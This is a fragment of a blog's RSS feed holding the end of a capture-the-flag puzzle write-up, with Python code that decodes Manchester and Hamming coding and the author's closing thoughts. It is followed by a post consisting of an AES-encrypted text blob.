class=&#34;line&#34;&gt;                code = code ^ (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;ind)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (((ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;&lt;span class=&#34;number&#34;&gt;0b1&lt;/span&gt;)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (((ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;&lt;span class=&#34;number&#34;&gt;0b10&lt;/span&gt;)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (((ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;&lt;span class=&#34;number&#34;&gt;0b100&lt;/span&gt;)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                code = code ^ (((ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;&lt;span class=&#34;number&#34;&gt;0b1000&lt;/span&gt;)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            m_pos = m_pos + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code = code ^ (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;random.randint(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;0:020b&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(code)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;from &amp;quot;&lt;/span&gt;+message+&lt;span class=&#34;string&#34;&gt;&amp;quot; to &amp;quot;&lt;/span&gt;+retStr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;HammingBolckInv&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message)==&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(message,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    wrong = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;ind)&amp;amp;code:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            wrong = wrong ^ (ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; wrong:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        code = code ^ (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;(wrong-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;(ind): &lt;span class=&#34;comment&#34;&gt;# Not parity check bit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            retStr = retStr + (&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; code&amp;amp;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;ind) &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Hamming&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message),&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        retStr = retStr + HammingBolck(message[ind:ind+&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;HammingInv&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message),&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        retStr = retStr + HammingBolckInv(message[ind:ind+&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;manchester&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; message:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        retStr += &lt;span class=&#34;string&#34;&gt;&amp;quot;01&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; char==&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;10&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;manchesterInv&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    retStr = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message), &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        char = message[ind]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        retStr += &lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; char==&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; retStr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bit_string=bit_string[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bit_string = HammingInv(manchesterInv(bit_string))[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(bit_string)+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x%&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = x - &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = x - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        message = &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(bit_string[start:end],&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)) + message&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(message)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;7-Final-Words&#34;&gt;&lt;a href=&#34;#7-Final-Words&#34; class=&#34;headerlink&#34; title=&#34;7. Final Words&#34;&gt;&lt;/a&gt;7. Final Words&lt;/h3&gt;&lt;p&gt;In my eyes, a good misc problem should not be an annoying puzzle. Steps to solve a misc problem have to be reasonable. For example, in this problem, Manchester coding is applied after the application of Hamming coding: that’s because the former is channel coding, and the latter is source coding. We shouldn’t just pick some random encryption and apply it to plaintext.&lt;/p&gt;
&lt;p&gt; I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. You’ll earn much more fun than those who can just use tools written by others without understanding fundamental principles (like me).&lt;/p&gt;
&lt;p&gt;ご武運を！&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/</guid>
            <title>WriteUp 日哭school-bus 上了那个writeup</title>
            <link>http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/</link>
            <category>Write-Up</category>
            <category>SchoolBus</category>
            <pubDate>Tue, 09 Nov 2021 11:08:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;密钥请找本人索取^_^&lt;br&gt;AES CBC Zero padding 128bits&amp;#x2F;block IV&amp;#x3D;0  UTF-8&lt;br&gt;qboAHUOHL+uw94b2elojCJWHWKwqPtIwFzSDKPZqmHPSu0APpp7H0ibcQNIUgrwDCCwdydqP+T74+slwNh6PM4GTvT1CoF2thGIZi5yCS9HfleGi5hP58rxFM3HzQxaU9EcxOEYbtGObactrCOzKP&amp;#x2F;+tPittHwWWiL5uEQyt8ESrZlgr19O5mtM4zrkRoODCUtcna5XWuatk94T60ToF6ZrhqTb5v60dcwGjw3Zf1xaBRvYR2HltlogOzs&amp;#x2F;QoLrDm&amp;#x2F;gzGqxvddGPCaOEkF5nCzk4un7sl6RJD77GVxRA4IqYMSExrw&amp;#x2F;By3bqLJyL+3waQihC4E3teqyknbLGbYCtF5VKV32WmE8H0hEyP0KkpO6MTJBiz4mziI3M0+pmoTXIRiBSpISAGq7RbKMIs2cOFD7Baxx+vUXuCShr7ZExYTi3bHD3r435&amp;#x2F;F4WXA9NuFaNM5Lhu+rmFBRobYZ2Ur3BBIFDlTT6gI5XXgoVj9qhHx5DJWFlGcglkgefiabVxUmTFFohZPLnpJxGJByTi6Frw+epqfZkrY0eGTMPIBKcwQDqh1DnPDyxm+64Xr5fffzpmG&amp;#x2F;HNyq8Nsa1qpk8Yw+Vu4l03oDZ9CX0msubse852dj0ySNKgYXSOKnYet8jdjSC2eVd14nypMuok1BPUoHMv4rlme813n&amp;#x2F;lE8LehT5xRF8R+HFyxfsRb354Xr39YX5DpI61tS41P1A+IiXbWvGG7kUk7Ln4mV+UJe6FEWzNzD5f0o3thGCoYd7ccyUrVJTbFsnbz7wuCmWS9dFkx3QAOxkGcbgyPh9NtbkcfKYa&amp;#x2F;znW6GibzQf3NQZ2W4jQl&amp;#x2F;wEtVPMs1BzweyAI3XGoJy7ZdHrvrswzdSq9rrcJLYW8TLG4lCowCRwb0gx1d9RptT4Tnj15poEl3zW66+L9dSb6RxTgsWrh0MM20xHmLmAEkoVG5QtGpZjQUIiKrq2BDahZtKWQayM1c+x8PtdZysfGYxyW+nzq&amp;#x2F;frGKmEKwo8GMqiLwevXk1aLryVVf57ofS56w+cyYAwmJtJ3ZKyeV26k4+WkV7EHBrTbItrz8EG8uP1eTzz922bAOhdWVck80iAc2QeolUYa6Ohp4GPP0tN2Q+CtBuPgjaPERjt42ZfhmstjJ9OoOiFObtUH72Rvg0i8aK+NsaSM48jxxuCJ8atXf57uu6giunfmaGaQ8fbdd395Sq7mTbvUiTVEn9tQX23xYfKcpnHSPMGfdcmeL5LdYg153QHLRLJ79&amp;#x2F;vFbTKt6iLLbcImzlNgs70xE78rKHG3YFrrGwd41&amp;#x2F;DSOxLqHYE5tiHkb32Haoy+&amp;#x2F;d6NAAzahYrhx2x28DVDmJbotGIEjpCw4hvWSwAkT3toy0aRE5XpVpzzqXqxaSTteM+Vifzr&amp;#x2F;+zynUM7SUwbMvONbqyhqC6tKtYtEOFoknu80e20Id7Ja9nfWH8s0Z7iWeb0p&amp;#x2F;8i5yHvZVuuYFnDkcOz1z7VGmi6B7W2KTp9BWcjTupzxH+pnoGV+hMUHFiBoYrZJzt5bFpvOzEYJDHhq4oh8jxZMeKADJBwDfoNFaBeN2tVS93HJ1tT18YwI4BsxiDjBuX351JfepxVrP0d0DNlT&amp;#x2F;rYgCyeXzIiz244JReySuLe6mALcEg0htTn7oZt6yONG1LVq8mfQ6GXrSqIaeBbNrfP3FF7C+7Vri45CvV39Rnt9y2r3eKdOW2VGf+8XZ8JBWKwpT65u1lKxim+FDxxmqxY1nStKtm3v6K5FtcsBz3LmNBJPB9oaILV10XWIPVVOpgD4MwV4XFT&amp;#x2F;vpgoVhL0Det0atbj1KBG8A0dhLZwcWx72l&amp;#x2F;yuAoCLuMoXciNPsVmngkkuCFVEziPxgPqVfPQTbGQbk4raRfOkCbkK5nAS4MTeEfr61fvQwYVXPYRTXDx1DWbTUABHbG0e5f8OG7fKNpC8c8m94sZM6osTLAdus73OC5Lj&amp;#x2F;iHsOYgjfkW1KRnL7W5b2UOdNgUVyQueSNBmQEw4sW9J5+LWYd4NRE0qL8TLrjhL26u6L6RBVMEJomjcAQnOBGIiBVl4jSAgt1HcpnDn7JyV95Th5pPEJ7YGtgLkBkuvIpiIW9sGLwWJsWkJwQXyFTSxMaJeaxyz6q725nxYXrIXIq7uGUJrDaN60GNnwgL&amp;#x2F;swzqqlmF0gdorXScCHc06roB+27rYV3kEEguhmsyoyxHdX4J33BEXeqigi3JaTrsVafApgIKZYhN&amp;#x2F;uH5UKHgZ4Xr8Qq&amp;#x2F;aTVcnv8ovm6jwTZRnQFCZaPKQ995TL5Rfm8gF4ejv32i2g&amp;#x2F;0F1bxwJ3sqYCEo4cDtsWXeAY9pidVji6BHZ25oSuiYb2G7TBpfoo26Ey8e4l5zM0KRgeBmk6g3iXILfY6DH71fjzptJ+H4I5anThAZMycGTkr7UzknBxCluU98JK4WQnU3klY4E4ZZbHrYGmO3UwRxEzyqfFVB4JFSDbuWy4OJzmDCX+LFMAD5PfOKIDAIQ1Skm6j&amp;#x2F;UqPXoVIZelOk0A57WCZ+&amp;#x2F;eP0O5fpc1JhtkPkvfr7yQjFIHtRbJb2toReQxHtLvrFhAyBvC28xxI63fX&amp;#x2F;C1At2u3agpy4KnUzAwdVAUVq9f2DjxTkrh3btk83i8aLG2QQvg6DCr7KB9Tw4exkc6MMxtjtpbwgZx0dLsh&amp;#x2F;SyYBTRs+LgsfsBLVg5FhviLay+47uuXl6CQBZHQXcBl8LmRxOrYsHQnkgQ1qBpl7uJO5ru1rTMdbDP4+TSoxNcUEFZcHal0Baz4Srikc447dhDkvPtnEdIdxJEN5xnbHqd0EsE1f3Dn2vQLcQ7BeYWWUGLCdLte95y6EdYvL1r96Ggqv6izkQ&amp;#x2F;aImw5Hif5KPuGt1Og8GPPlywv8wIDpi&amp;#x2F;7V2Xw1FCOuJXSQRJjoKow87AcpKmmjKEHew0QdI6cOEBDwZki5bjFA9j6LW3NckoFOu7QTaA5alDsTWKJMnwHEN6Mn3IfoPVs7bqM9q6sPmDyoVUd8AjgA2iYkaJlS8TcXqWLl7z&amp;#x2F;4F5GjmmV7a9hcY&amp;#x2F;ClYN7zhagdUaFakLKkw0ngzsjZP45&amp;#x2F;Hn0HWUfDH7NaLLovWi&amp;#x2F;wKXYqrrMZkvKqVDhSD4U57zKCS05tBg0jqoW2digZPvzHJHDq2UV5o&amp;#x2F;9MaIyTPgzU7JhUTrKOD+HzX3ZYvsFrmUfx9eiCVK57OkxfDGrzmVCgjX9ZIn2r0UzEbI1mfjHq75DiES38S2g67ypcnjnX4&amp;#x2F;o2qmHI9GR7xzsB70Ol96WGcoOvYn2v6&amp;#x2F;ldWx8dGOBRiTXUWve4jgtdCWupi4O8AikIhktX8sTJ+VBEhNr9negjA+FQj3y1xaPYl4LTyzpgiaeIDBUZnyt8Lgl&amp;#x2F;fi&amp;#x2F;Nm12nQDhE2vEJ3R2cjciLWG50b6U+9r94bS0nzbY0uupbI+fep8DE7ty4NHo0TtFF&amp;#x2F;58f49MEj7c56AWzLGanI+OnYqYJ7w5tCbhY4V01jYYwEX6Ur0GWOZvsmOeR1kCSMLVWRcNipjOBr8LA9JeTfVr0WPyvl4rBD0RJ2ITrP3jn85iHVYMUCmTiXaav6poh1+WCPYM2J9q4bdwK1TBxX2vBCv33t&amp;#x2F;e6wABwqh5wsy1APhgzL1ZTZrSsnCNfnPXbJXtWCaexkYF58gRZ3+I2XZgYvmj37TT53qhayl7sNImuGLFWuWVH0um+ldqP1u0joF+&amp;#x2F;BiJTD1gbgtSE+HW3r+Ntd5OgQBbXHhy54d4ABucD7RqFS95GlwadZV6v4AjJFKFYh1rnDZHKVDT9Ux301iTmwFvPatYPwCyJAmJ4bndBzhmwDl&amp;#x2F;yU8KFuZ8zbA8yUr5nrtSu9A&amp;#x2F;I6rsRtMdKQTJMRZ4iL5s1zmZTzPVF1&amp;#x2F;VOoqIVLP8kDtuyyxVXGUcufl6nIHCYoQlbvvXQV3TWIlnut2uWxuedeTuOS3vQj1JDnmkEnc&amp;#x2F;BmjeY2zGFgxtDpTjwW&amp;#x2F;Eh9SFJq9ZctkGkPdwrXCXr+DThhguEGXS7fGJeScW5fN0&amp;#x2F;u1w&amp;#x2F;V4c4VW9&amp;#x2F;GNDBZRuG6AyUjEjVABlBj4fER+2vhhzgnzhTnh+j5qNpMFy7Jhd0gmLgdywSUTrK2U96l9tcZYnIMOnLlAzinaqDauE9KigK+x4tWxEW9LMmfCsmV72BRaIpx8xrrmvaF0DYLKCqxvY3SdCU3YIxA6iIMhShTN15M6znJzq8kufcm6FJ+iO6bzDnDLSwdUteGfQCgHKAK4S&amp;#x2F;NPsChjP5OB&amp;#x2F;qWZsq1KCFTUh1+04E+F2oHfwMUitqLV1blL4KPUeImUx0ldbeXHtEMxHwWX9CQbU2Ksd9iyCB9oye4ANR5FDpYJBC5Yvb9SAMW18zT99I2FfS6S5umUDm&amp;#x2F;uTR0V3fAjWMDwwjhuWH9YZRqOADr9UXNHdJn5M4MagfplbfBdWWiU0Waxc+14EZkX0&amp;#x2F;62UKO5YyZzkHrv2X0jckDbGFuG29fY6PJOnmY+UN6JhOJ52OfrjR4KIrp2SORgHzEUqD6YzF8zhmBsMZ8AY9&amp;#x2F;GMAGLbV1zhbuIls5FzIX1JdeJNzEUt31nIz5rEfhgXQa5eHFUqxrE7xZTzajOG0e&amp;#x2F;CF&amp;#x2F;xJeTt85iii40wTADQ875fgxnR6hBbqVGb6PVKekN&amp;#x2F;1CNbCyqyp&amp;#x2F;NbS8rS5Q+49NVtF8anddxlb6PkliqxlKlrBUmQKDT1d5tgkEeyNj8cBS4Ve3bJG4Pd526iqqmyW8y&amp;#x2F;EiGLa6RwVe9VmUB2qp&amp;#x2F;4GlWqZ&amp;#x2F;tb4Z5T4KkXvpEv6MtV5+DHyjqlDNSmYcFL9N8Zk31TyVckkMWxcrvYZ+gZnCGqiQQPmCXhYfGlaMDkBhAZNSBZwX0c1fyKNCu7wA2D29l&amp;#x2F;NquX2VfowrYAExOVlh6Gpa0O0BlyqCJYwI0lnaPpqhnhaDO6mTiokYuWOiQnSrVRBGHk2cxLKt0VH&amp;#x2F;hL92mWc13+AmEemKcOJJaj9RRAWZ0t3H7WjgMhJgR26xJufcfES74EM1FEta1s8vboiDfcTOwXCdUInCnV0Pq2atGpq4oCxuM8YdlR+iopxMehFm&amp;#x2F;FdR5tedsLN87jJIEC&amp;#x2F;CJcWYLF3wE4lt9NOJk10ZHRxSgLS6&amp;#x2F;42fGTFx+chZaN7JxAFhKPttpz3PG038aclzC7G&amp;#x2F;fR0wUXnoi0U2Aide+DZfRWLn05rPDMRuodYTLet&amp;#x2F;4GdbIgdGOqa0LReMei3+g8Ej+h2s0qRxb5fyixwjwCO1HDny5tK4Y3iG&amp;#x2F;KbGXo0vsMymGcAQNphEn94EHk6oaBlHRbgtcwWOEqMlSLLyI5z3OqmoxK6WLj0Kw9g3YiSFSYhCNwa9gw9032cRSLxWDhGGBSF5T9wmjn2J7y4jgg1qrlQa1oTJ+Ep1jBsTQKJIds+E&amp;#x2F;+XK3&amp;#x2F;dCQLIBWkcQFGXblOkukLR&amp;#x2F;uhCdMhhLcbsz1GqYI&amp;#x2F;29K7A6uj+zm8Ep&amp;#x2F;uLgpBQFrxFuIUYFQ4&amp;#x2F;1OO&amp;#x2F;ZkuscEGirPyeDkVeRHVjCt6JFCWUFC0X6ZNtbmSyD51BFNmv+gJroUxhddlWDADjDWI63N7tTWIPJ5mkv9VRM5WGZFrxSIiIZ9M4PXNTErzxRB3008xdtbUrKqlBuoPWsRK4Cea4IdiOyyISAtallenfMlWGvNV1FNzKY1CliJRLtEErg+5UurywxwuMDerKcMx5c&amp;#x2F;+3MoCtFTCLOp3JI8uL6M2qWbSuRFd1Q6PEEH&amp;#x2F;QUTHtmxopXhztQ5zoclhcKKugfxhz1iQLVRohWD&amp;#x2F;xnbjahebmp9pV836wIjebrltKo31KpluhberLabcbIBtGAqtT6BtadXtcwPX5ensTQNN7U6xPE4IAREcClVchuzQGalwss2s1si9D64RHkqX97txTJQ3Yk7xuGa+OmPCNPCGGadbEKbrhIPpCI&amp;#x2F;3ryILqToozUfDjXQrzl3rvNyxAy9pwtcWj1iBGFN&amp;#x2F;8JBkCBi0B+IspyFYk65RkOfiXE6X1I6IjjYyAUszYInPfOeY8RKrSnuxBj401BlRljYkTALlITzxAzVBytpxQwP4Ofhj1Gty8JVBdsveNvA2M6fw524lGFOadqThTqdP330aqL1HrJhhw&amp;#x2F;cZo+wAYmvo9dgrbDLlK8yDyLtBhRmCQAnwf&amp;#x2F;CtdVK3bqAlw2xr2S0tBNIq5dC&amp;#x2F;9QU+yiJSJlf57Ui186BnzLNLmfkpWxU5oW3RnWXaM21bqNvrarqnqEKxcQiTTP6Le1BDhuoceKzzB7rPlMjPO6GUXO3pFaZfMgwwPmNBvFEnCEsLngzjObiJARrEmtV&amp;#x2F;I5RRTUXMAwCK5ookoSFfFVfqTih36sJOaBCCDR+TEkQ3zQE2ZvV35OTb586cPbvp0B3Vd+RRnF79Z4+56etRg38pDY9EEFj&amp;#x2F;&amp;#x2F;trgxQ&amp;#x2F;QkYclWHqeUWm5pKhFZ+g2qLMlVs1K0q8d6sSsvt0R7iuDZtNZZLd9D&amp;#x2F;lxyz7rkGT7DpqTpOjvRZqG+VGquYaLFId+xE6nqPM8CEWz1&amp;#x2F;NT8691a6XX7qCdWSm78nmrZ&amp;#x2F;IX4IGGc5LZBLo8j9sf9lXqGNqSYKOjdkEIKswoYTfxRk4y4&amp